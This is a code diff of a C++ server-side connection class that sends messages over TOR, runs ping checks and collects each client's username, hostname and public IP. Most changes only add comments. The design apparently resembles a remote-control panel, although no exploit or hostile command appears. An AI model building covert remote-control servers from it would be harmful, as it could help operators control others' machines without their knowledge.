@@ -15,20 +15,19 @@ public: // Making everything public temporarily
     std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
     std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
     bool lastConnectivityCheck = false; // Last result of the connectivity check
-    bool terminalActive = false;
-    std::vector<std::string> plainTextMessageHistory;
-    int selectedMessage = 0;
-    char inputBuffer[1024] = {0};
-    const unsigned int inputBufferSize = 1024;
-    std::string msgToSend = "";
+    bool terminalActive = false; // Whether or not the terminal is being displayed and used
+    std::vector<std::string> plainTextMessageHistory; // Elements of this vector are displayed in the terminal
+    char inputBuffer[1024] = {0}; // Used for the text input box
+    const unsigned int inputBufferSize = 1024; // Size of the input buffer - could probably get rid of this dumb variable
+    std::string msgToSend = ""; // This will be derived from the input buffer
 
     /*
         Constructor
     */
     connection(int sockFd, struct sockaddr_in address, int addrlen){
        this->sockFd = sockFd;
-       this->address = address;
-       this->addrlen = addrlen;
+       this->address = address; // !!! Not being used
+       this->addrlen = addrlen; // !!! Not being used
     }
 
     ~connection(){
@@ -37,14 +36,7 @@ public: // Making everything public temporarily
         this->sockFdMutex.unlock();
     }
 
-    bool sanityCheck(){
-        if(this->sockFd < 0){
-            return false;
-        }
-        return true;
-    }
-
-    void drawDebugWindow(){
+    void drawDebugWindow(){ // Draws some basic debug info to the screen
         ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
         ImGui::SetNextWindowSize(ImVec2(25, 6), ImGuiCond_Once);
         ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " debug info").c_str());
@@ -55,7 +47,7 @@ public: // Making everything public temporarily
         ImGui::End();
     }
 
-    void drawTerminalWindow(){
+    void drawTerminalWindow(){ // Draws a listbox with the message history, and an inputbox for sending messages
         ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
         ImGui::SetNextWindowSize(ImVec2(35, 10), ImGuiCond_Once);
         ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());
@@ -76,6 +68,7 @@ public: // Making everything public temporarily
         ImGui::End();
     }
 
+    // Send an std::string to the client
     void sendMsgPlaintext(std::string msg){
         this->sockFdMutex.lock();
         int bytesSent = send(this->sockFd, msg.c_str(), msg.length(), 0);
@@ -88,6 +81,7 @@ public: // Making everything public temporarily
         this->msgToSend = "";
     }
 
+    // Draws the window and sends messages
     void update(){
         if(this->terminalActive){
             this->drawTerminalWindow();
@@ -111,8 +105,8 @@ public: // Making everything public temporarily
         fcntl(this->sockFd, F_SETFL, flags);
     }
 
+    // Send "ping" to the client, if the client does not respon with "ping;pong;", return false
     bool connectivityCheck(){
-        // Send "ping" to the client, if the client does not respon with "ping;pong;", return false
         this->sockFdMutex.lock();
         int bytesSent = send(this->sockFd, "ping;", 5, 0);
         if(bytesSent != 5){
@@ -132,6 +126,7 @@ public: // Making everything public temporarily
         return true;
     }
 
+    // Gets some information from the client and returns true if successful
     bool intialConnection(){
         this->sockFdMutex.lock();
         // Receive the username, hostname, and public IP from the client
